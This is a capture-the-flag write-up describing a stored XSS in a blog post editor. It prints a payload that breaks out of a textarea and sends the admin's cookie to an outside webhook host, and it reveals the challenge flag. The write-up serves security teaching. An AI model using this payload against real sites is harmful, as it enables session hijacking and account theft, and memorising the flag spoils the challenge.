# Challenge `Read my lips: No more scripts!` Writeup

- Vulnerability: 
  - XSS attack
- Where:
  - Blogpost creation content
- Impact:
  - allows to steal remote user's cookie

## Analyzing the server

This challenges consists in grabbing the admins' cookies.

Trying to inject JavaScript code in the search bar or in the new blogpost area will not work if the input is simply
`<script>aler(1)</script>`, reviewing the source code reveals that the input is being rendered as plain text.

## Exploit

Start by creating a new post with some random title and content.
Then, by opening the source code of the page, notice that the content is a textarea and whatever we enter is then
rendered on the screen after clicking the `Update post` button.
This means that we can close the textarea tag and inject JavaScript code that when rendered will execute.
It's possible to test this by injecting `</textarea><script>alert(1)</script>`  and clicking the `Update post` button.
To steal the admin's cookie, we can re-use the payload from the previous challenge that sends a GET request to a webhook
site with the `document.cookie` appended to the URL.
Write the following payload in the content textarea:
`</textarea><script>location='https://webhook.site/your-unique-id/'+document.cookie;</script>`
and click `Update post and send it for admin review` button.
This will then be loaded on the admin's browser and the cookie will be sent to the webhook site, revealing the cookie `SSof{Reject_this_blogpost.Too_many_weird_chars.I_dont_get_it}`

## Implementation

No script needed.